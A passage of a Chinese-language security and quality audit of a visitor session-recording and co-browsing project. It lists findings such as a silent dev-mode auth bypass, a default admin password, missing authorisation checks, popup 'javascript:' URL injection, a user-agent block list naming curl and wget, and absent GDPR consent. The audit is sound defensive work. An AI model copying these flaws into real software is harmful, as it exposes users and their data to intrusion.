- **问题**:`FlagSession` 在 ws.go BehaviorTracker 中调用标记可疑 session,但 `IsSessionFlagged` 全代码库零调用 —— 没有任何地方消费这个标记。1i 升级说"接线 BehaviorTracker 到 visitor WS",但只接了写入端,读取端从未接入。
- **影响**:行为分析看起来在跑(每 100 事件 CheckAndFlag),实际完全是空操作。攻击者就算被标记,服务无任何反应。
- **修复**:在 `/ws/operator` accept、`/api/sessions` 列表、replay handler 中至少检查 flagged 状态并返回警告或拒绝服务

#### [P1-30] `queries.sql` 与 `queries.go` 并存且不同步
- **文件**:`server/internal/storage/queries.sql`(62 行 sqlc 查询)、`queries.go`(569 行手写)
- **问题**:文件头注释说"sqlc 安装失败,此文件手写等价查询"。两份代码并存,字段/参数顺序/注释已出现偏差。
- **修复**:二选一 —— 真用 sqlc 生成(删 .go 手写),或删 .sql 并在 .go 注释说明放弃 sqlc 的原因

#### [P1-31] Element Plus 注册后零使用
- **文件**:`admin/src/main.ts:3,16`
- **问题**:`app.use(ElementPlus)` + 全量 CSS 引入,但全仓 `grep -rn "el-\|ElMessage\|from 'element-plus'" admin/src/` 除 main.ts 外零命中 —— 所有 UI 是手写 CSS。bundle 白白增大。
- **修复**:真用(替换原生 button/input),或从 main.ts 移除并更新 PLAN.md

#### [P1-32] `extractFullSnapshotEnvelope` 的 `_ context.Context` 参数从未使用
- **文件**:`server/internal/api/ws.go:453`
- **修复**:移除 ctx 参数(同时改 ws.go:228 调用点)

---

## 4. P2(改进)

### 安全加固

- **[P2-1 CWE-532]** `chat.go`/`command.go` 把 PG 错误细节返回客户端(`detail: err.Error()`)— `server/internal/api/session.go:66`、`server/internal/api/command.go:83`。dev 输出 detail,prod 只输出 generic error code。
- **[P2-2 CWE-693]** WS upgrade 缺 CSRF token / Origin 二次校验 — `server/internal/api/ws.go:63,263`。admin SPA 加载时拿一次性 WS token,WS 连接必带。
- **[P2-3 CWE-1004]** Redis/PG 默认无密码/弱密码,compose 暴露端口到 host — `docker-compose.yml:25-26,40-41,58-60`。Redis 加 `--requirepass`;prod profile 不 publish 端口(只内部网络);PG `pg_hba.conf` 限制。
- **[P2-4]** `visitor-sdk/src/fingerprint.ts:64-72` `simpleHash` 32-bit DJB 变种,碰撞概率高 — 攻击者伪造相同 fingerprint 关联他人 session。注释说明"仅启发式"。

### 生产运维

- **[P2-5]** `server/sqlc.yaml` 是死代码 — `sqlc.yaml` 配置生成到 `internal/storage/sqlc/`,但该目录不存在;`queries.go` 手写。要么删 sqlc.yaml 改 spec,要么真跑 `sqlc generate`。
- **[P2-6]** docker-compose 全服务无资源 limit — `docker-compose.yml`。加 `mem_limit: 512m`/`cpus: '1'`。
- **[P2-7]** `minio/minio:latest` 非固定版本 — `docker-compose.yml:52`。固定到 release tag。
- **[P2-8]** CI 无 govulncheck / gosec — `.github/workflows/ci.yml:35-36`。AGPL 项目尤其需 gosec 检测供应链。
- **[P2-9]** ci.yml `compose-smoke` 只验 migrations up 跑通,不验 down/up 干净循环 — 加一步 `migrate up && migrate down 1 && migrate up`。
- **[P2-10]** 5 个 Go 包零单测(api/storage/config/logging/cmd) — `go test ./...` 输出全 `[no test files]`。本次审计多个 P0 都因没测试才得以存在。每个包加表驱动测试;router_test.go 至少测 SERVER_ENV=prod 路径 + dev bypass 路径。
- **[P2-11]** Hub 测试用 mock `Client{}` 而非真 WS — `server/internal/hub/hub_test.go:29-37`。1i BehaviorTracker 接线的真实 ws.go read loop 完全无测试。
- **[P2-12]** TS 测试仅 2 个 trivial smoke — admin `1+1=2` + visitor-sdk `1+1=2` 占位。

### 测试质量

- **[P2-13]** 1a 场景3 vacuous assertion — `e2e/tests/1a-smoke.spec.ts:26-31`:`expect(hasScript).toBeGreaterThanOrEqual(0)` 永真。
- **[P2-14]** 1h AuthMiddleware prod 模式完全无 e2e — `server/internal/api/middleware.go`。所有 e2e 跑 dev,prod 行为从未触达。加 SERVER_ENV=prod 模式 e2e 或 Go 单测用 httptest 覆盖三条路径。
- **[P2-15]** 1i 行为分析 e2e 场景4 只验证"server 不崩" — `e2e/tests/1i-antiscrape.spec.ts:80-100`。加 redis-cli 查 `flagged:session:*` 真存在。

### LLM 可改写性

- **[P2-16]** `Options` struct 单一使用,未形成模式 — `server/internal/api/router.go:34`。其他构造器用 6+ 位置参数(`NewWSHandler`)。
- **[P2-17]** Magic numbers 散落 — `server/internal/hub/client.go:50 (256)`、`hub/room.go:9,54 (64)`、`api/ws.go:42 (1<<20)`、`api/ws.go:341 (256)`、`api/ws.go:247 (100)`、`antiscrape/behavior.go:94,106,112 (50/20/100 启发式阈值)`、`antiscrape/ratelimit.go:136 (10*time.Minute flag TTL)`。集中到 `config/limits.go`。
- **[P2-18]** Go 接口几乎为零 — 全 server 只 2 个 interface。api 包紧耦合具体 `*Postgres`,22 方法全挂在 queries.go。引入 Repository interface。
- **[P2-19]** `admin/src/utils/` 单文件目录 — 命名规范说不用 utils/common/helpers,但 admin 有 utils。挪到 `composables/useTime.ts` 或 `i18n/time.ts`。
- **[P2-20]** `visitor-sdk/src/index.ts` 240 行把所有职责塞进 `MarketingMonitorSDK` class — 抽 `SDKOrchestrator` + `SDKContext`。

### 代码质量

- **[P2-21]** SDK 端 5 个 EventPayload 工厂函数 + `clearCachedSessionId` 死代码 — `visitor-sdk/src/proto/events.ts:52-94`、`session.ts:65`。
- **[P2-22]** admin `VisitorList.vue:31` 仍有英文硬编码 `{{ v.eventCount }} events` — 1j 抽 i18n 时漏。
- **[P2-23]** ChatPanel.vue 用 2s 轮询替代 WS 推送 — `admin/src/components/ChatPanel.vue:57-60`。与 PLAN.md "中心化 hub-and-spoke" 决策不一致。
- **[P2-24]** CoBrowseOverlay 的 fillInput/releaseControl 通过 defineExpose 暴露但父组件从不消费 — `admin/src/components/CoBrowseOverlay.vue:150,164,174` + `Dashboard.vue:118-123`。"运营代填"在 UI 上无触发入口(只能通过 SDK 端 ESC 释放)。1f "代填"admin 端实际无法手动触发。
- **[P2-25]** 12 处 `context.WithTimeout(..., 5*time.Second)` magic timeout 散落 — `server/internal/api/*.go`。抽常量。
- **[P2-26]** `ratelimit.go` Redis 不可用时静默 `c.Next()` — `server/internal/antiscrape/ratelimit.go:42-46`。PLAN.md §5 "反爬虫是一等公民"。至少 `logger.Warn`,考虑 fail-closed 配置。
- **[P2-27]** `claim.go` 多处 `_ = h.stores.Redis.X(...)` 忽略错误 — `claim.go:54,65,79,93`。claim 写入失败应返回 500。
- **[P2-28]** `operatorWS` 中 `restartSubs` 是简化实现 — `server/internal/api/ws.go:344-366`(同 P1-8)。
- **[P2-29]** `visitorWS` 单函数 190 行超过 80 行阈值 — `server/internal/api/ws.go:62-252`。抽 `acceptAndHello()`/`registerVisitor()`/`readLoop()` 三段。
- **[P2-30]** `parseSince` 仅支持 h/d 单位,无法表达分钟级 — `server/internal/api/replay.go:273-295`。admin 与 server 共享枚举。

### 文档

- **[P2-31]** `docs/progress/` 目录物理不存在 — CLAUDE.md / doc-structure / naming-conventions 多处引用。创建 `.gitkeep` 或调整规范。
- **[P2-32]** `docs/reports/completed/2026-06-17-v1-slice-plan.md:5` 链 `../../progress/...` 断链 — progress 文件不存在。
- **[P2-33]** 1a spec L45 + README L81 写 "Go 1.22+",实际 go.mod 1.25.0、Dockerfile 1.25、CI 1.25(1j 升级)。
- **[P2-34]** 1j spec L11 "全部 98 处" vs impl claim "20+ 处" — 数字口径混乱。
- **[P2-35]** spec 模板格式不统一(1a-1f 详尽 vs 1g-1j 极简) — `docs/templates/` 加 spec.md 模板。
- **[P2-36]** impl 报告尾部都嵌"v1 切片进度表"且过期(1g/1h/1i/1j) — 全删,全局状态以 project-status.md §5 为单一事实源。
- **[P2-37]** daily 2026-06-18 L140 e2e 数字算式不准 — "42/42 全部通过(原 38 + 新加 4 个 1i 强测 + 4 个 1j 真 e2e - 占位 skip)",算式 38+4+4=46 ≠ 42。

### 其他

- **[P2-38]** `antiscrape/ratelimit.go:69-74` 自定义 `max` 函数 shadows Go 1.21+ builtin — 删,直接用 builtin。
- **[P2-39]** `ChatPanel.vue:62` `import { onUnmounted }` 应在顶部 — 上移合并。
- **[P2-40]** `ReplayList.vue:1,89-96` 双 `<script>` 块拆单 helper — 合并到 setup。
- **[P2-41]** `health.go` 不真检查 DB/Redis/MinIO 依赖 — `server/internal/api/health.go:14-19` 仅返回 `{"status":"alive"}`。K8s liveness/readiness 误判。

---

## 5. Badge 虚标汇总(建议降级)

| 切片 | project-status 当前 claim | 建议修正 | 主要证据 |
|---|---|---|---|
| 1a | 🟢 | 🟡 | e2e 场景3 vacuous assertion (`toBeGreaterThanOrEqual(0)`);场景4 `test.skip(MM_E2E_DEV==='1')` 静默跳过 |
| 1b | 🟢 | 🟡 | SDK 重连 / MinIO checksum 完全无覆盖;hub 测试用 mock Client |
| 1c | 🟢 | 🟡 | 脱敏测试 vacuous truth(iframe 内容取不到);canvas/WebGL 选择性截图、rrweb 韧性 3 次重试无 e2e |
| **1d** | 🟢 | **🟢** ✅ | live→historical 切换、短/长 session 分页(1000+ 事件)、replay 控制器渲染深度够 |
| 1e | 🟢 | 🟡 | 3 处静默跳过;cursor SVG/ESC 紧急退出/PG 审计表 e2e 跳过 |
| 1f | 🟢 | 🟡 | 4 处静默跳过(**全部场景**) |
| 1g | 🟢 | 🟡 | 4 处静默跳过(**全部场景**);双向聊天未真验,只测 admin→visitor 单向 |
| **1h** | 🔴 | **🔴** ✅ | 自承 spec partial 准确 |
| 1i | 🟢 | 🟡 | **🚨 关键 Go 测试 FAIL in package(P0-9)**;e2e 场景1 自承"dev 模式跳过限流";e2e 场景4 只验"server 不崩",未真查 Redis flag |
| **1j** | 🟢 | **🟢** ✅ | i18n 中英切换真验证、docker-prod 真启动、CI workflow 结构验证、README 命令验证;无静默跳过 |

**修正后 v1 实际深度分布**:🟢 verified-deep ×2(1d, 1j) / 🟡 verified-shallow ×7(1a, 1b, 1c, 1e, 1f, 1g, 1i) / 🔴 implemented-unverified ×1(1h)。

与 project-status.md §5 声称的 "🟢 ×9" 差距巨大,**9 个中 7 个虚标**。

---

## 6. 跨切片共性问题

1. **认证/授权分层断裂**:1h 切片完成认证 middleware,但 1e(command)/1f(navigate URL check)/1g(chat)/1h(claim) 端点都没有把已认证 user_id 真正用于权限决策,只用作"是否登录"的 boolean。多运营场景的"1:1 锁定"在代码层面根本不存在,只有 Redis 里一个 KV 标记。
2. **dev/prod 双轨默认偏向便利而非安全**:`SERVER_ENV=dev` 默认值 + rate limit 仅 prod + auth bypass 仅 dev + AdminPassword 默认值 + docker-compose prod 回退 dev 凭证 —— 多处"默认不安全"叠加,任何配置遗漏即开放。
3. **审计字段语义错误**:`command.go` 把 `c.ClientIP()` 写入 `operator_id`(audit 列名误导);`chat.go` 让客户端控制 `sender` 字段。审计完整性低,事故追责无依据。
4. **GDPR/CCPA 完全缺失**:无 consent、无 erasure、retention 只覆盖 1/5 的表。PLAN.md §10 明确要做,代码层完全没动。
5. **WS read loop 缺乏公平性/资源控制**:1MiB/条但无频率/总量限制,DoS 面积大。
6. **死代码集中爆发在"曾经规划但未接线"的功能**:BehaviorTracker flag 写入 Redis 无读出方(1i)、CoBrowseOverlay 的 fill/release expose 无消费方(1e/1f)、FlushSessionNow 无调用方(1d)、e2e helpers 整目录未被引用(1b-1j)、`pingEvery` 字段无 ping 实现(1b)、queries.sql 与 queries.go 并存(1b)、`Envelope.TraceID` 0 使用、`NewRouter` deprecated 但保留、`Element Plus` 注册零使用。模式一致:写代码时按 spec 写了"将来会用"的 hook,接入步骤没完成,注释里仅含糊标注。
7. **错误吞噬模式**:claim.go、ratelimit.go、room.go 多处 `_ = err` / `default: // 丢弃` / `c.Next()` 静默失败。违反 CLAUDE.md "全链路可观测性"。
8. **timeout 魔法数字**:5s/3s/2s 散落 12+ 处,应统一为常量。
9. **admin 端 i18n 抽 key 漏点**:VisitorList 的 "events"、admin/src/utils/time.ts、SDK 全部字符串。
10. **三方 proto 手写**:每个切片(1b envelope、1c events、1e command、1f presence.navigated、1g chat/popup)都触发改 3 份文件(Go + SDK TS + admin TS),但 admin TS 经常被忘(admin/src/proto 缺 command.ts)。LLM 改协议时极易漏 admin 端。
11. **magic number 散落**:每个切片引入自己的阈值(1b batch 100ms/50events、1c snapshot TTL 5min、1d flush 1000events/30s、1e command 5s timeout、1f navigate 域名白名单、1g popup dismissible、1i rate limit 60/min + 行为 100 events + flag TTL 10min、1j i18n)。无 `server/internal/config/limits.go` 集中。
12. **`stores.PG.XxxMethod` 直连**:每个切片加 SQL 方法都直接挂在 `*Postgres` 上,无 Repository 抽象,导致 22 方法全在 queries.go。
13. **impl 报告尾部都嵌入"v1 切片进度表"**:都过期(快照在写报告当时)。任一处更新都易遗漏。
14. **数字/版本/状态字段分散在 4-5 处文档,无单一事实源**:切片 badge/进度/版本号在 project-status / docs/README / impl 报告 / MEMORY.md / verification-depth.md 多处复制。

---

## 7. 与 project-status.md §6 已知风险的关系

### §6 风险,本次审计**强化**(实际比 §6 描述更严重)

| §6 条目 | 强化点 |
|---|---|
| 🔴 1h 登录 UI 完全未实施 | 配合 P0-1(`SERVER_ENV=dev` 默认值),实际是 P0:**即使 admin UI 没登录,API 层也已被 dev mode 完全开放**。两层都坏。 |
| 🔴 1i BehaviorTracker 死代码 | A 阶段已接线写入端(ws.go:193-250),**但读取端 IsSessionFlagged 零调用**(P1-29),整个行为分析仍是空操作。§6 描述未更新这条。 |
| 🟡 1h 浅测 | 实际更深:1h AuthMiddleware prod 模式整个分支零覆盖(P2-14),且 1h 报告自承 spec partial,prod 模式认证也未测 |
| 🟡 1i 浅测,rate limit 仅 prod 生效 | 从测试问题升级为部署安全问题(P0-1)+ 关键测试当前 FAIL in package(P0-9) |
| 🟡 HeadlessChrome UA ban 是死代码 | 实际 `builtinBannedUAs` 包含 18 个 UA(curl/wget/python-requests/scrapy/bot/crawler/spider 等),不是只有 HeadlessChrome。HeadlessChrome 本身确实对现代 Playwright 无效,但其他 17 个仍能挡低水平爬虫。§6 描述略夸大(实际**削弱**)。 |
| migrations 未用 migrate CLI | 实测 dev DB 无 schema_migrations 表;CI 用 `psql -f`;`make migrate-down` 会丢全部数据且无确认(P0-13/14)。比 §6 描述严重。 |
| 5 个 Go 包零单测 | 不仅是覆盖率,**直接导致 P0-1 auth bypass / P0-2 默认凭据没被任何测试拦截**。 |

### §6 未列,本次新发现的关键风险

**安全 P0**:silent auth bypass(P0-1)、default admin password(P0-2)、command/chat/claim 无权限校验(P0-3)、claim TOCTOU race(P0-4)、GDPR consent 缺失(P0-5)、GDPR erasure 缺失(P0-6)、docker-compose prod 回退 dev 凭证(P0-7)、popup javascript: 注入(P0-8)。

**测试 P0**:1i ratelimit_test FAIL in package(P0-9)。

**文档 P0**:README/docs/README/1j 报告三处严重虚标 v1 完成(P0-10/11/12)、migrate-down 无保护(P0-13)、schema_migrations 部署路径未用(P0-14)。

**LLM 可改写性 P0**:`IMPLEMENTATION_PLAN.md` 完全缺失、变更安全策略(原则 7)零落地、可观测性"一等公民"完全缺失(LifecycleTracker 0 实现)、三方 proto 手写无 codegen。

---

## 8. Action Plan(按修复优先级 + 切片建议)

### T0 — 部署阻断,立即修(对应 P0-1 ~ P0-8 安全 + P0-13/14)

**建议合并到新切片 `1k-security-blockers`**:

- P0-1 + P0-2 + P0-7:统一处理 silent defaults(`SERVER_ENV`/`AdminPassword`/`PG_PASSWORD`/`MINIO_SECRET_KEY` 改 fail-fast + 显式 required)
- P0-3 + P0-4:command/chat/claim 接入 user_id 授权 + claim 改 SET NX + UUID 解析修复
- P0-5 + P0-6:新建 `1l-privacy-gdpr` 切片(consent UI + erasure API + GC 扩展)
- P0-8:popup URL 白名单
- P0-13 + P0-14:migrations embed 进二进制 + 启动自动 up + down 加保护

### T1 — Badge 降级 + 关键测试修复(对应 P0-9 ~ P0-12)

- 更新 `project-status.md §5` badge 表(7 个降 🟡,见 §5)
- P0-9:1i ratelimit test fix(unique IP + FlushDB setup)
- P0-10/11/12:README/docs/README/1j 报告 三处虚标修正
- P1-11/12/13/14:e2e 静默跳过 + vacuous truth + 缺失场景补真验证

### T2 — 修 P1 余项(27 条)

按 安全(P1-1~P1-9) → 测试(P1-10~P1-14,部分已在 T1) → 可观测性(P1-15/16) → LLM 可改写(P1-17~P1-23) → 代码质量(P1-24~P1-32)。

### T3 — 修 P2(26 条)+ P3(14 条)

可结合 `1h-ui`(登录 UI + Vue Router 守卫 + AuthMiddleware prod 模式 e2e)一并处理。

### 后续切片路线(建议 PLAN.md §8 增补)

- `1h-ui`(已规划):admin LoginView + Vue Router 守卫 + AuthMiddleware prod 模式 e2e
- `1k-security-blockers`:本审计 T0 安全栈
- `1l-privacy-gdpr`:consent + erasure + retention 扩展
- `1m-observability`:LifecycleTracker + event_type + trace_id WS 链路
- `1n-test-depth`:7 切片 badge 升级回 🟢

---

## 9. CLAUDE.md "可观测性开发" 合规度

| 要求 | 合规度 | 证据 |
|---|---|---|
| 结构化 JSON 日志 | **100%** | `logging/handler.go` prod 走 JSONHandler;grep `fmt.Println/Printf/log.Println` 全部 0 hits |
| 字段含 timestamp/level/msg/trace_id/span_id/event_type/payload | **60%** | timestamp/level/msg 由 slog 默认提供;trace_id/span_id 仅 HTTP 路径覆盖;**event_type 完全未实现**(handler.go:5 注释承诺但调用 0 次);payload 字段未规范化 |
| trace_id 覆盖率 | **~30%** | 仅 HTTP middleware 自动注入;WS handler 内 defer 清理用 `context.Background()` 丢失;Flusher/GC goroutine 完全无 trace_id |
| LifecycleTracker 装饰器 | **0%** | grep `LifecycleTracker` 0 hits |
| 函数进入/退出/异常埋点 | **~5%** | 仅少数 handler 有 InfoContext |
| 关键节点埋点(if/else/loop/外部 API) | **~20%** | visitor WS read loop 有部分;flushSession MinIO Put/PG INSERT/XTRIM 三步前后无 Point;GC.runOnce 内 if err 分支无 event_type=Error |
| Execution Trace Report | **0%** | 不存在 |
| 埋点与业务解耦(装饰器) | **0%** | 所有日志手写在业务代码内 |

**总体合规度估计:25-30%**。CLAUDE.md 把"可观测性开发"列为强制要求,实际实现严重不足。

---

## 10. CLAUDE.md "LLM Friendly" 7 原则评分

| 原则 | 合规度 | 关键证据 |
|---|---|---|
| 1. 一致分层 | **7/10** | server/internal/{api,hub,storage,antiscrape,recording,proto,logging,config} 职责清晰;admin/src/{views,components,stores,composables,api,i18n,router,proto} 一致;visitor-sdk/src/{collectors,commands,proto,ui,transport} 一致。**降分**:`admin/src/utils/time.ts` 单文件目录违反;`storage/queries.go` 集中所有 SQL 没按表/聚合根分文件。 |
| 2. 单一职责 | **6/10** | `router.go` 287 行做 4 件事;`ws.go` 529 行混合 visitor WS + operator WS + 4 helper;`queries.go` 569 行 22 方法全在 Postgres 上。无 init() 副作用,无循环 import。 |
| 3. 显式类型契约 | **7/10** | Go 强类型全 exported 显式;TS strict + noUnusedLocals + noFallthroughCasesInSwitch。**降分**:`Envelope.Payload any`/`payload?: T = unknown` + 三方手写维护没 codegen;`admin/src/views/ReplayViewer.vue:24 let player: any`;Go `CommandPayload.Type string` 弱约束 vs TS literal union 强约束。 |
| 4. 声明式配置 | **6/10** | `Config` struct 用 `env` tag 好;`Options` pattern 1 处;`Config`/`RateLimitConfig`/`GCConfig` 有 `DefaultConfig()`;TS 有 `as const` + `satisfies`。**降分**:magic numbers 散落;`builtinBannedUAs` 是 `var` 而非 `const`。 |
| 5. 可搜索性 | **5/10** | 命名规范文档列 7 类前缀,但实际代码采用率 <5%;`extractXY`/`scanVisitor`/`buildCommandPayload`/`forEachEventPayload` 等命名风格混杂;Go 构造器统一用 `New*` 但文档要求 `create*`,冲突未说明。 |
| 6. 小步提交计划 | **5/10** | CLAUDE.md 第 39 行明确要求 `IMPLEMENTATION_PLAN.md`;**项目根没有此文件**。切片 spec + impl 在 `docs/reports/completed/` 配对完整(20 份)。Git log 是小步的,但宏观"下一步要做什么"靠 project-status.md §7 而非 IMPLEMENTATION_PLAN.md。 |
| 7. 变更安全策略 | **2/10** | **完全缺失**:项目根无 `/backup` 目录;无 rollback 流程文档;sqlc 失败时直接手写替代而非走 backup→rollback 流程;废弃函数保留无删除时间表。 |

**总体评分:5.4/10**。原则 1/3 在 TS 侧和分层做得相对好,原则 5/6/7 是主要欠债。

---

## 11. 关键文件路径汇总(供后续 PR)

### 安全 / 部署(P0)

- `/Users/rong.zhu/Code/marketing-monitor/server/internal/config/config.go`(P0-1, P0-2, P1-9)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/api/middleware.go`(P0-1)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/api/router.go`(P0-1, P1-5)
- `/Users/rong.zhu/Code/marketing-monitor/server/cmd/server/main.go`(P0-2, P1-1, P1-6)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/api/command.go`(P0-3, P2-1)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/api/chat.go`(P0-3)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/api/claim.go`(P0-3, P0-4, P1-24, P2-27)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/api/auth.go`(P1-2, P1-3)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/api/ws.go`(P0-3 DoS, P1-4, P1-6, P1-8, P2-26)
- `/Users/rong.zhu/Code/marketing-monitor/visitor-sdk/src/ui/popup.ts`(P0-8)
- `/Users/rong.zhu/Code/marketing-monitor/visitor-sdk/src/commands/handler.ts`(P0-5, P1-23)
- `/Users/rong.zhu/Code/marketing-monitor/visitor-sdk/src/index.ts`(P0-5)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/recording/gc.go`(P0-6)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/storage/queries.go`(P0-6 缺 Delete 方法)
- `/Users/rong.zhu/Code/marketing-monitor/docker-compose.yml`(P0-7, P2-6, P2-7)
- `/Users/rong.zhu/Code/marketing-monitor/server/migrations/*.down.sql`(P0-13)
- `/Users/rong.zhu/Code/marketing-monitor/Makefile`(P0-13, P0-14)
- `/Users/rong.zhu/Code/marketing-monitor/.github/workflows/ci.yml`(P0-14, P2-8, P2-9)

### 文档虚标(P0)

- `/Users/rong.zhu/Code/marketing-monitor/README.md`(P0-10)
- `/Users/rong.zhu/Code/marketing-monitor/docs/README.md`(P0-11)
- `/Users/rong.zhu/Code/marketing-monitor/docs/reports/completed/2026-06-17-slice-1j-implementation.md`(P0-12)
- `/Users/rong.zhu/Code/marketing-monitor/docs/project-status.md`(§5 badge 降级建议)

### 测试(P0/P1)

- `/Users/rong.zhu/Code/marketing-monitor/server/internal/antiscrape/ratelimit_test.go`(P0-9)
- `/Users/rong.zhu/Code/marketing-monitor/e2e/tests/1{e,f,g}-*.spec.ts`(P1-11)
- `/Users/rong.zhu/Code/marketing-monitor/e2e/tests/1b-realtime.spec.ts`(P1-12)
- `/Users/rong.zhu/Code/marketing-monitor/e2e/tests/1c-rrweb.spec.ts`(P1-13)
- `/Users/rong.zhu/Code/marketing-monitor/e2e/tests/1e-cobrowse.spec.ts`(P1-14)

### 可观测性 / LLM 改写(P1)

- `/Users/rong.zhu/Code/marketing-monitor/server/internal/logging/{middleware,handler}.go`(P1-15, P1-16)
- `/Users/rong.zhu/Code/marketing-monitor/server/internal/proto/envelope.go`(P1-21)
- `/Users/rong.zhu/Code/marketing-monitor/IMPLEMENTATION_PLAN.md`(P1-17,应新建)
- `/Users/rong.zhu/Code/marketing-monitor/{server/internal/proto,visitor-sdk/src/proto,admin/src/proto}/`(P1-18)
- `/Users/rong.zhu/Code/marketing-monitor/docs/standards/change-safety.md`(P1-19,应新建)
- `/Users/rong.zhu/Code/marketing-monitor/admin/src/utils/time.ts`(P1-22)
- `/Users/rong.zhu/Code/marketing-monitor/visitor-sdk/src/ui/chatWidget.ts`(P1-23)

---

## 12. 验证命令清单(可重复执行)

```bash
# 1. Go 测试(应全部 PASS,当前 antiscrape 包 FAIL)
cd server && go test ./... -count=1

# 2. 1i ratelimit 复现 P0-9 flaky
cd server && go test ./internal/antiscrape/ -count=1 -v

# 3. SERVER_ENV=dev 默认值确认
grep -n 'envDefault:"dev"' server/internal/config/config.go

# 4. claim.go UUID 解析错误确认
grep -n 'Sscanf' server/internal/api/claim.go

# 5. AuthMiddleware dev bypass 确认
grep -n 'devMode\|uuid.Nil' server/internal/api/middleware.go

# 6. 默认 admin password 确认
grep -n 'changeme123' server/internal/config/config.go

# 7. sslmode=disable 硬编码确认
grep -n 'sslmode=disable' server/internal/config/config.go

# 8. popup action_url 直赋 href 确认
grep -n 'btn.href' visitor-sdk/src/ui/popup.ts

# 9. command/chat/claim 无 user_id 权限校验确认
grep -n 'user_id' server/internal/api/{command,chat,claim}.go

# 10. e2e 静默跳过模式确认
grep -rn 'if (!.*\.length) return' e2e/tests/

# 11. Badge 一致性(project-status vs docs/README vs impl 报告)
grep -E '🟢|🟡|🔴' docs/project-status.md docs/README.md docs/reports/completed/*.md | head -50

# 12. 死代码确认
grep -rn 'FlushSessionNow\|IsSessionFlagged\|isFullSnapshotEnvelope\|TouchVisitor\|CountEventBlobsBySession\|GetVisitorByFingerprint\|NewRouter(' server/ | grep -v _test.go | grep -v 'func '

# 13. Envelope.TraceID dead field 确认
grep -rn '\.TraceID' server/internal/

# 14. migrations down 全 DROP 确认
grep -l 'DROP TABLE' server/migrations/*.down.sql

# 15. schema_migrations 表不存在确认(docker compose up 后)
docker compose exec postgres psql -U mm -d marketing_monitor -c '\dt schema_migrations'
```

---

## Notes

- 本报告仅作发现汇总与建议,**不修改任何业务代码、不修改 project-status.md**(grill-me 共识达成)。
- 所有 P0 都经过主线交叉验证(`go test -count=1 -v` 实跑、grep 实查、文件实读),不是 agent 推测。
- 7 切片 🟢→🟡 badge 降级是建议,**最终是否降级由用户决定**。
- 修复建议按"切片合并"思路给出(1k-security-blockers / 1l-privacy-gdpr / 1m-observability / 1n-test-depth),用户可自行调整 PLAN.md §8。
- 本审计消耗 ~6 个 subagent 并发 + 主线整合;如需重复审计,可在 `docs/audits/` 增量更新而非全量重做。
- 审计未覆盖:500 WS/房间并发性能(需真实压测)、MinIO PutObject 在 500 并发下的失败率、PG 连接池饱和点 —— 这些需要动态压测,非静态审计可定。
